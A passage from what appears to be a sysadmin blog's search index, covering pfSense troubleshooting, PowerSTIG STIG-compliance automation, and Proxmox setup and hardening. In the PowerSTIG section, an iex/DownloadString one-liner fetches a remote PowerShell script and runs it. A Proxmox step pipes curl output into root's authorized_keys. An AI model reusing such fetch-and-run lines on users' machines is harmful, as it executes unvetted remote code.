seek=58650\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#troubleshooting","title":"Troubleshooting:","text":"<p>TO DO</p> <p>Install Issues: https://docs.netgate.com/pfsense/en/latest/troubleshooting/installation.html</p> <p>Upgrade Issues: https://docs.netgate.com/pfsense/en/latest/troubleshooting/upgrades.html</p> <p>Broken PKG DB: https://docs.netgate.com/pfsense/en/latest/troubleshooting/pkg-broken-database.html</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#unable-to-obtain-ip-address-or-access-gui","title":"Unable to Obtain IP Address or Access GUI","text":"<p>I've only been able to replicate this when adding BRIDGE and SPAN interfaces for port mirroring, then making changes to the dashboard GUI layout.</p> <p>Something causes the management interface DHCP server to stop leasing IP addresses.</p> <p>Luckily IPv6 Link-Local scope is a direct connection without the need for IPv4 style DHCP.</p> <ol> <li>Obtain your connected interface's inet6 local address (fe80::x) with <code>ip a</code> or <code>ifconfig</code>.</li> <li>Capture packets on your connected interface with <code>sudo tcpdump -i &lt;iface&gt; -n -vv</code> and look for both fe80::x addresses, the one opposite of yours is pfSense's address.</li> </ol> <p>NOTE: I have not been able to get a browser to connect to an IPv6 address. You may have better luck; <code>http://[fe80::1111:2222:3333:4444]:443/</code></p> <ol> <li>Port forward with SSH into the interface so you can browse to the GUI: <code>ssh -L 8443:127.0.0.1:443 &lt;pfsense-user&gt;@fe80::aaaa:bbbb:cccc:1234%&lt;your-iface&gt;</code></li> <li>Point your browser to <code>https://127.0.0.1:8443</code></li> <li>Re-enable DHCP for the interface that lost it; <code>Services &gt; DHCP Server &gt; &lt;iface&gt;</code> check <code>Enable</code></li> </ol>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#management-stack-fails-to-load-after-reboot","title":"Management Stack Fails to Load After Reboot","text":"<p>Observed Conditions</p> <p>This has only been replicated on an SG-1100 under heavier network strain.</p> <p>On occassion this has happened, if for example you're streaming Netflix or running high volume network scans (<code>nmap</code>) while needing to reboot pfSense. In cases like this, everything comes back online in 2-3 minutes, but you'll find you cannot reach the management interfaces over SSH or HTTPS, no matter how you're trying to reach them.</p> <p>When this happens the simplest solution is to connect via the serial console, and reboot the machine one more time. Over time logs may be added here that could point to why this happens, but so far no consistent issue has been found.</p> <p>Serial Connection</p> <p>If you have your pfSense box installed in some sort of rack and have the space, leaving the serial cable connected and wrapped up behind the device while not in use may save you time if you ever need to reconnect again.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#pfsense-fails-reconnecting-to-tailnet","title":"pfSense Fails Reconnecting to Tailnet","text":"<p>Sometimes after a reboot Tailscale may not connect back to your tailnet. Simply restart the Tailscale service to fix this.</p> <p>If you use Tailscale to manage pfSense remotely this can be an issue. Having an alternate remote access method such as SSH (even externally with limited ingress rules) or another jump box connected to your Tailnet on pfSense's management subnet, can save you.</p>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/","title":"Get Started with PowerSTIG","text":"<p>Use PowerSTIG to automate STIG compliance across a number of  items like WindowsServer, IIS, Adobe, Chrome, RHEL, Ubuntu, Vsphere, SqlServer, and more, while maintaining documentation of the state as a PowerShell configuration file. This is similar to my approach of using Ansible tags to maintain and combine machine states.</p> <ul> <li>PowerSTIG: Wiki</li> <li>PowerSTIG: GitHub</li> </ul> <p>The documentation is fairly in depth, but if you don't know how to use DSC or the related Windows-centric DevOps tools, the documentation can become incredibly hard to follow and non-linear. This walkthrough is meant to show you how to install PowerSTIG and get a machine into the required state in a clean, easy to understand way.</p>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#install","title":"Install","text":"<p>Install the module from the PowerShell gallery. You'll be prompted to trust the PSGallery (all remote repos are untrusted by default). Then install the required DSC resources. Use this exact command block on the \"controller node\" (if you're used to Ansible's language) as well as all remote nodes you're applying changes to via PSRemoting. PowerSTIG must be installed on each endpoint that will be configured.</p> <pre><code>Install-Module PowerSTIG -Scope CurrentUser\n\n(Get-Module PowerStig -ListAvailable).RequiredModules | % {\n   $PSItem | Install-Module -Force\n}\n</code></pre>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#paths","title":"Paths","text":"<p>You'll find everything in the following paths:</p> <pre><code># PowerSTIG Base Path\nC:\\Users\\Administrator\\Documents\\WindowsPowerShell\\Modules\\PowerSTIG\n\n# Raw STIG XML Data, where 4.22.0 is this PowerSTIG version\nC:\\Users\\Administrator\\Documents\\WindowsPowerShell\\Modules\\PowerSTIG\\4.22.0\\StigData\\Processed\n</code></pre> <p>Under <code>StigData\\Processed</code> you'll find each policy has two related files:</p> <ul> <li><code>POLICY_NAME.org.default.xml</code>: Commented options, where there's no one default value. Copy this file to a central location</li> <li><code>POLICY_NAME.xml</code>: The rest of the rules in the policy with default values</li> </ul> <p>Working Folder for Custom Policy Files</p> <p>A good way to store these is by creating a folder for each policy. The DSC script modules expect paths to files, rather than the files themselves. Separating these configurations by folder will reduce headaches when working with multiple policies.</p> <pre><code># List all unique policies\n$PowerStigVersion = (Get-Module PowerStig -ListAvailable).Version.ToString()\n$StigDataPath = \"C:\\Users\\Administrator\\Documents\\WindowsPowerShell\\Modules\\PowerSTIG\\$PowerStigVersion\\StigData\\Processed\\\"\n#(gci -Path $StigDataPath | Split-Path -Leaf).Replace(\".xml\",\"\").Replace(\".org.default\",\"\") | sort -Unique\n\n# Create a folder for WindowsServer-2022-MS-1.5, WindowsDefender-All-2.4, WindowsFirewall-All-2.2\n$PolicyFileList = @(\"WindowsServer-2022-MS-1.5\",\"WindowsServer-2022-DC-1.5\",\"WindowsDefender-All-2.4\",\"WindowsFirewall-All-2.2\")\nforeach ($PolicyFile in $PolicyFileList) {\n    $DevPath = \"C:\\Tools\\PowerSTIGDev\\$PolicyFile\"\n    New-Item -Type Directory -Path $DevPath 2&gt;$nul\n    Copy-Item $StigDataPath$PolicyFile.org.default.xml -Destination $DevPath\n}\n</code></pre> <p>Organizational Settings</p> <p>This is a customized organization file example for Microsoft Edge. It uses DuckDuckGo and Google as the defined search engines.</p> <pre><code>&lt;!--\n    The organizational settings file is used to define the local organizations\n    preferred setting within an allowed range of the STIG.\n\n    Each setting in this file is linked by STIG ID and the valid range is in an\n    associated comment.\n\n    Modified to use DuckDuckGo instead of Bing\n--&gt;\n&lt;OrganizationalSettings fullversion=\"1.8\"&gt;\n    &lt;!-- Ensure 'V-235719' is reviewed for needed configuration settings --&gt;\n    &lt;OrganizationalSetting id=\"V-235719\" ValueData=\"\" /&gt;\n    &lt;!-- Ensure all of the search URLs in the list begin with \"https\" --&gt;\n    &lt;OrganizationalSetting id=\"V-235726\" ValueData='[{\"allow_search_engine_discovery\": false},{\"is_default\": true,\"name\": \"DuckDuckGo\",\"keyword\": \"duckduckgo\",\"search_url\": \"https://duckduckgo.com/?q={searchTerms}\"},{\"name\": \"Google\",\"keyword\": \"google\",\"search_url\": \"https://www.google.com/search?q={searchTerms}\"}]' /&gt;\n    &lt;!-- Ensure 'V-235752' is 1 or 2 or 3 --&gt;\n    &lt;OrganizationalSetting id=\"V-235752\" ValueData=\"2\" /&gt;\n    &lt;!-- Ensure 'V-235766' is 2 or 3 --&gt;\n    &lt;OrganizationalSetting id=\"V-235766\" ValueData=\"3\" /&gt;\n&lt;/OrganizationalSettings&gt;\n</code></pre>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#winrm","title":"WinRM","text":"<p>Configure each node for WinRM with the following. This will open the machine to external connections with a firewall rule.</p> <pre><code># Set basic winrm settings\nwinrm quickconfig\n\n# Get the name of the public profile\nGet-NetConnectionProfile\n\n# Update the InterfaceAlias parameter with the name of the profile from above\nSet-NetConnectionProfile -InterfaceAlias 'Ethernet' -NetworkCategory Private\n\n# Update the WSMAN MaxEnvelopeSizekb\nSet-Item -Path WSMan:\\localhost\\MaxEnvelopeSizekb -Value 8192\n</code></pre> <p>MaxEnvelopeSizekb</p> <p>See the bottom of this page for details.</p> <p>You may receive the error (especially after applying a STIG):</p> <pre><code>The WinRM client sent a request to the remote WS-Management service and was notified that the request size exceeded the configured MaxEnvelopeSize quota.\n</code></pre> <p>To resolve this, do:</p> <pre><code># Update the WSMAN MaxEnvelopeSizekb\nSet-Item -Path WSMan:\\localhost\\MaxEnvelopeSizekb -Value 8192\n</code></pre> <p>Access Denied / The user name or password is incorrect</p> <p>PSRemoting can be tricky to get working. Be sure in additon to the above steps you're using an FQDN for the <code>-ComputerName</code>, as well as checking if the HTTP SPN exists for that machine.</p> <pre><code># Where HOSTNAME is the target machine you're trying to remote into\nsetspn -A HTTP/HOSTNAME.domain.internal HOSTNAME\nsetspn -A HTTP/HOSTNAME HOSTNAME\n</code></pre>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#psremoting-over-ssh","title":"PSRemoting over SSH","text":"<p>\u26a0\ufe0f This section still needs tested. Theoretically it works since later versions of PowerShell understand PSRemoting over SSH.</p> <ol> <li>Install winget (Copy / paste the entire block)</li> <li>Install the latest version of PowerShell <code>winget install --id Microsoft.Powershell --source winget</code></li> <li>Install OpenSSH-Server</li> <li>Enable the PowerShell subsystem in OpenSSH-Server (see the code snippet below)</li> <li>Create a public / private keypair and load it into your ssh-agent</li> </ol> <pre><code># Enable the PowerShell subsystem in OpenSSH-Server\necho 'Subsystem powershell c:/progra~1/powershell/7/pwsh.exe -sshs -nologo' | Out-File -Path $env:ProgramData\\ssh\\sshd_config -Encoding ASCII -Append\nRestart-Service sshd\n</code></pre>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#compile-mof","title":"Compile MOF","text":"<p>To compile and maintain MOF-based (Managed Object Format) resources, use a PowerShell script module. This script module was created from one of the examples for WindowsServer under the wiki's Composite Resources.</p> <ul> <li>WindowsDefender Configuration Script Module Examples</li> <li>WindowsFirewall Configuration Script Module Examples</li> </ul> <p>Write this to a file such as <code>C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5\\WindowsServer2022-MS-1.5.ps1</code> and run it to generate the MOF file of <code>localhost.mof</code>. The MOF file is written to the <code>OutputPath</code> based on the line at the bottom of the script: <code>Example -OutputPath C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5</code>.</p> <pre><code>&lt;#\n    Use embedded STIG data while skipping rules and inject exception data.\n    Example for baselining WindowsServer 2022 that isn't a DC.\n#&gt;\n\nconfiguration Example\n{\n    param\n    (\n        [parameter()]\n        [string]\n        $NodeName = 'localhost'\n    )\n\n    Import-DscResource -ModuleName PowerStig\n\n    Node $NodeName\n    {\n        WindowsServer BaseLine\n        {\n            OsVersion   = '2022'\n            OsRole      = 'MS'\n            StigVersion = '1.5'\n            # Domain and Forest don't need specified if you're already domain joined, unless you're scanning cross-forest\n            #DomainName  = 'sample.test'\n            #ForestName  = 'sample.test'\n            #Exception   = @{'V-1075'= @{'ValueData'='1'} }\n            # Rules '254442-4' Involve DoD certificates which we won't have access to\n            # Rule 'V-254254.c' breaks on WindowsServer 2022: https://github.com/microsoft/PowerStig/issues/1360#issuecomment-2176146847\n            # Rule 'V-254439' denies interactive logon for Enterprise Admins,Domain Admins,Local account,Guests this can interfere when testing\n            SkipRule = @('V-254442','V-254443','V-254444','V-254254.c','V-254439')\n            OrgSettings = \"C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5\\WindowsServer-2022-MS-1.5.org.default.xml\"\n        }\n    }\n}\n\nExample -OutputPath C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5\n</code></pre> <p>Encountering Errors</p> <p>In writing this guide, an issue was encountered with the WindowsServer2022 MS STIG 1.5 policy. The fix was to skip rule <code>V-254254.c</code>, as this should only apply to Domain Controllers (DC, not MS). Any easy way to <code>tail -F /var/log/syslog</code> and get a sense of what's happening is with Tail-EventLogs.ps1.</p> <pre><code>iex(New-Object Net.WebClient).DownloadString('https://github.com/straysheep-dev/windows-configs/raw/main/Tail-EventLogs.ps1');\nTail-EventLog -LogName Microsoft-Windows-DSC/Operational\n</code></pre> <p>Have this running in another PowerShell tab to monitor logs related to DSC.</p> <p>Similarly, if using the DC 1.5 policy, be sure your machine's <code>hostname</code> is valid, and use your DC's FQDN below for <code>-ComputerName</code> when running audits or setting the state.</p> <p>Here's what your working folder should look like now:</p> <pre><code>    Directory: C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         7/13/2024  11:46 PM         312314 localhost.mof\n-a----         7/13/2024  11:30 PM           5775 WindowsServer-2022-MS-1.5.org.default.xml\n-a----         7/13/2024  11:46 PM            812 WindowsServer2022-MS-1.5.ps1\n</code></pre>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#backup-and-revert","title":"Backup and Revert","text":"<p>After you compile the MOF file, PowerSTIG 4.10.0 and later has the ability to create a backup reference point based on a STIG profile you'll be applying, so it knows what to revert to.</p> <p>Test Reverts</p> <p>While writing this guide, PowerSTIG did not always completely undo its changes. Be sure to review all of this in a test environment first.</p> <p>Create the backup.</p> <pre><code>$DevPath = \"C:\\Tools\\PowerSTIGDev\"\n$Policy = \"WindowsServer-2022-DC-1.5\"\nBackup-StigSettings -BackupLocation $DevPath\\$Policy  -StigName $Policy'.xml'\n</code></pre> <p>This creates a <code>.csv</code> backup file under the <code>$DevPath$Policy</code> path.</p> <p>Revert the system's state.</p> <pre><code>$Policy = \"WindowsServer-2022-DC-1.5\"\nRestore-StigSettings -StigName $Policy'.xml' $DevPath$Policy\\PowerSTIG_backup_WindowsServer-2022-DC-1.5.xml_08_16_2024_01_02_03.csv\n</code></pre>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#audit-a-policy","title":"Audit a Policy","text":"<p>Check the localhost's current state against the policy, and load the results into a variable called <code>$audit</code>. This is useful to do first, so you can check which rules will need applied to your machine. Then you can determine if they will impact functionality or not.</p> <pre><code># Local mof file\n$audit = Test-DscConfiguration -ComputerName localhost -ReferenceConfiguration C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5\\localhost.mof\n# Shared mof file, must be scripted and automated or done interactively from client\n$audit = Test-DscConfiguration -ComputerName localhost -ReferenceConfiguration \\\\dc01.domain.internal\\PowerSTIGDev\\WindowsClient-11-1.6\\localhost.mof\n\n# View compliant settings\n$audit.ResourcesInDesiredState | Out-GridView\n\n# View non-compliant settings\n$audit.ResourcesNotInDesiredState | Out-GridView\n\n# Save results\n$audit.ResourcesInDesiredState | Out-File -FilePath C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5\\ResourcesInDesiredState.log -Encoding ASCII\n$audit.ResourcesNotInDesiredState | Out-File -FilePath C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5\\ResourcesNotInDesiredState.log -Encoding ASCII\n</code></pre> <p>This is an example of what the <code>Out-GridView</code> looks like (behind the MS Edge window).</p> <p></p>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#apply-a-policy","title":"Apply a Policy","text":"<ul> <li>Apply a configuration (MOF) document to a machine</li> </ul> <p>What can be confusing is <code>-Path</code> requires a path to where the <code>.mof</code> file lives, not a full path of the <code>.mof</code> file.</p> <pre><code>Start-DscConfiguration -ComputerName localhost -Path C:\\Tools\\PowerSTIGDev\\WindowsServer-2022-MS-1.5 -Wait -Verbose\n</code></pre> <p>This will start a background job and apply the machine state. You may need to reboot to apply every change.</p>"},{"location":"blog/2024/07/19/material-powershell-get-started-with-powerstig/#remote-automation","title":"Remote Automation","text":"<p>This can also be confusing if you're familiar with Ansible, which uses the locally installed copy of python over ssh on each endpoint to perform module tasks without an agent. In this sense, PSRemoting can't leverage the \"controller\" node's PowerSTIG module. PowerSTIG must exist on each endpoint to work. Deployment ultimately could be done with a GPO to pull the MOF file from the DC (or a fileshare). Interactively trying to test your actions and reach the DC via PSRemoting results in the double-hop problem. You'll have to test this over RDP from one client.</p> <ul> <li>Each endpoint needs PowerSTIG installed</li> <li>The DSCEA tool mentioned is only for auditing and reporting, not configuring states</li> <li>You're effectively configuring each endpoint to pull the MOF file and run it on \"localhost\", vs running a module on an inventory</li> </ul> <p>Create the SMB share.</p> <pre><code>$Parameters = @{\n    Name = 'PowerSTIGDev'\n    Path = 'C:\\Tools\\PowerSTIGDev'\n    FullAccess = 'Contoso\\Administrator', 'Contoso\\Contoso-DEV1$'\n    ReadAccess = 'Everyone'\n}\nNew-SmbShare @Parameters\n</code></pre> <p>Write the deployment script to <code>\\\\DOMAIN\\SYSVOL</code>, or in some format so a GPO can tell each domain-joined host in scope to pull these files, and run PowerSTIG locally based on the machine's role. The example below is a very simplified way of doing this, checking if the machine is a Workstation or DomainController before applying a STIG policy.</p> <pre><code>&lt;#\n  Applies STIG states to domain-joined endpoints.\n  Can be configured to run via a logon script with a GPO or similar.\n#&gt;\n\n\nif ((Get-ComputerInfo).OsProductType -eq \"Workstation\") {\n\n    Start-DscConfiguration -ComputerName localhost -Path \\\\dc01.domain.internal\\PowerSTIGDev\\WindowsClient-11-1.6\\\n\n} elseif ((Get-ComputerInfo).OsProductType -eq \"DomainController\") {\n\n    Start-DscConfiguration -ComputerName localhost -Path \\\\dc01.domain.internal\\PowerSTIGDev\\WindowsServer-2022-DC-1.5\\\n\n}\n</code></pre> <p>Group Policy</p> <p>This is much better handled through an organized Group Policy. For instance if you have all of your DNS servers grouped together, then create a GPO linked to only that OU to execute PowerSTIG's DNS profile.</p> <p>In this case you don't need any script logic, the machines just need access to the correct MOF / PowerSTIG files.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/","title":"Proxmox","text":"<p>Get started with Proxmox. Installation considerations, networking, disk encryption options, and migrating existing virtual machines.</p> <p>Everything's presented in a useful order to follow if you're used to Hyper-V, VMware Workstation, or VirtualBox and want to jump in by moving to a Proxmox server.</p> <p>What's most interesting about Proxmox is the Web UI gives you full console and GUI (yes, GUI desktop) access to your VM's through either noVNC or SPICE, even via a smart phone.</p> <p>\ud83d\udcda Proxmox VE Documentation</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#download","title":"\u23ec Download","text":"<p>Verifying Signatures</p> <p>The ISO URL points to an <code>/iso/</code> folder on the Proxmox webiste. Browsing this manually reveals the following files:</p> <ul> <li>https://enterprise.proxmox.com/iso/SHA256SUMS.txt</li> <li>https://enterprise.proxmox.com/iso/SHA256SUMS.asc</li> </ul> <p>You can use these along with the following public key to verify the ISO's integrity.</p> <pre><code>gpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys 'F4E136C67CDCE41AE6DE6FC81140AF8F639E0C39'\n\n# list keys\npub   rsa4096/0x1140AF8F639E0C39 2022-11-27 [SC] [expires: 2032-11-24]\n    Key fingerprint = F4E1 36C6 7CDC E41A E6DE  6FC8 1140 AF8F 639E 0C39\nuid                   [ unknown] Proxmox Bookworm Release Key &lt;proxmox-release@proxmox.com&gt;\n</code></pre>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#install","title":"\ud83d\udcbd Install","text":"<p>Walk through the graphical or terminal installer. This is straight forward if you're used to installing hypervisor software.</p> <p>Email</p> <p>You'll need to choose an email address to send alerts to, this can be <code>root@localhost</code> or a real email.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#access","title":"\ud83d\udd11 Access","text":"<p>Proxmox listens on 22/tcp (SSH) and 8006/tcp (Web UI).</p> <p>You can browse directly to your Proxmox machine's <code>https://&lt;IP&gt;:8006</code> or use SSH. SSH allows you to do local port forwarding which will help you access the web interface from a jump host.</p> <p>Jump Hosts</p> <p>Tailscale</p> <p>You can install Tailscale on proxmox, since it's Debian under the hood. This is a great way to isolate and access the management interface from authorized tailnet nodes.</p> <p>From WSL to Jump Host</p> <p>This example has a Yubikey connected to WSL on Windows:</p> <ul> <li>The Yubikey is required to SSH into Proxmox</li> <li>SSH Windows:8006 &gt; WSL:8006</li> <li>SSH WSL:8006 (with Yubikey) &gt; JumpHost:SSH-PORT &gt; Proxmox:8006</li> <li>Now point your Windows browser to https://127.0.0.1:8006</li> <li>It will forward to WSL which uses a jump host to forward again to proxmox's localhost:8006</li> </ul> <pre><code># On Windows Host\n$wsl_user = wsl.exe whoami\n$wsl_ipv4 = wsl.exe ip addr show eth0 | sls \"(?:(?:192\\.168|172\\.16|10\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))\\.)(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\\.)(?:25[0-4]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" | ForEach-Object { $_.Matches.Value }\nPS&gt; ssh -L 127.0.0.1:8006:127.0.0.1:8006 $wsl_user@$wsl_ipv4\n\n# On WSL\nJUMP_HOST_USER=''\nJUMP_HOST_IP=''\nJUMP_HOST_PORT=''\nPROXMOX_USER=''\nPROXMOX_IP=''\n$ ssh -L 127.0.0.1:8006:127.0.0.1:8006 -J $JUMP_HOST_USER@$JUMP_HOST_IP:$JUMP_HOST_PORT $PROXMOX_USER@$PROXMOX_IP\n</code></pre>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#configure","title":"\u2699\ufe0f Configure","text":""},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#mfa","title":"\ud83d\udd10 MFA","text":"<p>First, add 2FA/MFA to your root login. This can be a software token saved to your password manager or authenticator app, plus a hardware key using webauthn.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#package-repositories","title":"\ud83d\udce6 Package Repositories","text":"<p>Next, if you have a valid enterprise subscription key, you're good to go. If not, disable the enterprise repos and enable the pve-no-subscription repo.</p> <ul> <li>\ud83c\udf10 Proxmox VE Enterprise / No-Subscription Repository</li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#system-updates","title":"\ud83d\udcbb System Updates","text":"<p>GUI: Click <code>Updates</code> then <code>Refresh</code> to run <code>apt-get update;</code> finally <code>&gt;_ Upgrade</code> to run <code>apt-get dist-upgrade</code></p> <p>You can also run these from a bash shell on the Proxmox VE host.</p> <ul> <li>\ud83c\udf10 Proxmox VE System Software Updates</li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#ssh-authentication","title":"\ud83d\udc1a SSH Authentication","text":"<p><code>root</code> is allowed to login with a password by default. You can disable this in <code>sshd_config</code> once you've added your key to <code>authorized_keys</code>:</p> <pre><code>curl https://github.com/USERNAME.keys | tee -a /root/.ssh/authorized_keys\n# symlink to /etc/pve/priv/authorized_keys\n\nsed -i_bkup 's/^.*PasswordAuthentication.*$/PasswordAuthentication no/g' /etc/ssh/sshd_config\nsystemctl restart sshd\n</code></pre>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#firewall","title":"\ud83d\udd25 Firewall","text":"<p>The firewall is off by default. To enable it:</p> <ul> <li>Datacenter &gt; Firewall &gt; Options &gt; Click <code>Firewall ... No</code> to highlight it &gt; Click <code>Edit</code> &gt; Check <code>Firewall</code></li> <li>Now <code>iptables -S</code> will reveal a set of default rules</li> </ul> <p>If you enable it, the only default allow rules are to 22/tcp and 8006/tcp from the local subnet.</p> <p>Firewall Isolation</p> <p>You can enable the firewall at the Proxmox node level, as well as per-VM to isolate lateral traffic between VM's on the same bridge interface. This requires nothing more than simply enabling the firewall for each VM, the default rules allow outbound but drop inbound. Keep in mind this will also prevent you from remoting into VM's directly without some type of reverse tunnel or proxy.</p> <p>You can define specific rules to the Proxmox VE host and VM guests from the GUI or using a text editor on:</p> <ul> <li><code>/etc/pve/nodes/&lt;nodename&gt;/host.fw</code> Host configuration</li> <li> <p><code>/etc/pve/firewall/&lt;VMID&gt;.fw</code> VM / Container configuration</p> </li> <li> <p>\ud83c\udf10 Proxmox VE Firewall</p> </li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#suricata","title":"\ud83d\udd0e Suricata","text":"<p>You can install suricata IPS on the Proxmox host. Keep in mind REJECTED or DROP'd packets do not go to suricata.</p> <pre><code>apt-get install suricata\nmodprobe nfnetlink_queue\n</code></pre> <ul> <li>\ud83c\udf10 Proxmox VE Firewall Tips and Tricks</li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#users","title":"\u2328\ufe0f Users","text":"<p>To see all system users: Datacenter &gt; Permissions &gt; Users</p> <p>User details for the PVE realm are defined on the filesystem under <code>/etc/pve/user.cfg</code> (note that passwords are under <code>/etc/pve/priv/shadow.cfg</code>).</p> <p>Users in the PAM realm are still stored under <code>/etc/passwd</code>,<code>shadow</code> and the usual system paths.</p> <ul> <li>\ud83c\udf10 Proxmox VE User Management</li> <li>\ud83c\udf10 Proxmox VE User Management: Examples</li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#groups","title":"\ud83d\udcc7 Groups","text":"<p>To see, create, and modify groups: Datacenter &gt; Permissions &gt; Groups</p> <p>These are effectively user defined, based on what your needs are. Groups are a way to tie multiple users to one or more permission sets.</p> <ul> <li>\ud83c\udf10 Proxmox VE Groups</li> </ul> <p>Proxmox has a built-in set of permission \"roles\" that you can get started with. These are covered below.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#realms","title":"\ud83d\udcda Realms","text":"<p>Proxmox understands two authentication \"realms\", which are \"pve\" and \"pam\".</p> <p>PVE &amp; PAM Realms are Two Separate Things</p> <ul> <li>PVE: Authentication and permissions tied directly to Proxmox-specific functionality (GUI/API)<ul> <li>A user created in the PVE realm doesn't necessarily have direct Linux shell access outside of the Proxmox GUI/API</li> </ul> </li> <li>PAM: Authentication to, and controlled by, the underlying OS (for shell or SSH access)<ul> <li>PAM can still be used as an auth realm via the GUI</li> <li>In other words, a PAM account can be expanded to have GUI/API access, but a PVE account must have a separate PAM account for shell access</li> </ul> </li> </ul> <p>Testing User Access</p> <p>You can try and verify how this works by creating users however you'd like, and seeing what level of access they have to the UI, API, and console / SSH, one step at a time. This is the best way to visualize and understand what's required and what the authentication mechanisms expect.</p> <p>Users and Realms Examples</p> <ul> <li>A user created in the web UI, under the PAM realm, doesn't have a shell account automatically; you must create this</li> <li>There isn't even a way to set a password like this either; the expectation is the user account already exists on the OS underneath</li> <li>A user created via a utility like <code>useradd</code> from the shell, does not automatically have an account in the web UI</li> <li>In this case, create your user with <code>useradd</code>, then create them in the web UI tied to the PAM realm, and you can login to the web UI with that user</li> <li>Similarly you must create a shell account for a web UI user that you'd like to have shell access, say a unique admin account</li> <li>Users can even have the <code>Sys.Console</code> permission in Proxmox, but won't be able to use the shell or SSH unless they know a valid login to the OS underneath</li> </ul> <p>Example Continued </p> <p>Here we're using the Proxmox utility <code>pveum user add</code> to create a user in the Proxmox \"side\" of the system, but tie their authenticaiton to PAM:</p> <pre><code>root@pve:~# pveversion\npve-manager/8.4.1/2a5fa54a8503f96d (running kernel: 6.8.12-11-pve)\nroot@pve:~#\nroot@pve:~# pveum user add testuser@pam\nroot@pve:~#\nroot@pve:~# pveum user list\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\n\u2502 userid       \u2502 comment                         \u2502 email          \u2502 enable \u2502 expire \u2502 firstname \u2502 groups \u2502 keys \u2502 lastname \u2502 realm-type \u2502 tfa-locked-until \u2502 t\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\n\u2502 admin@pve    \u2502 Standard administrative user.   \u2502                \u2502 1      \u2502      0 \u2502           \u2502        \u2502      \u2502          \u2502 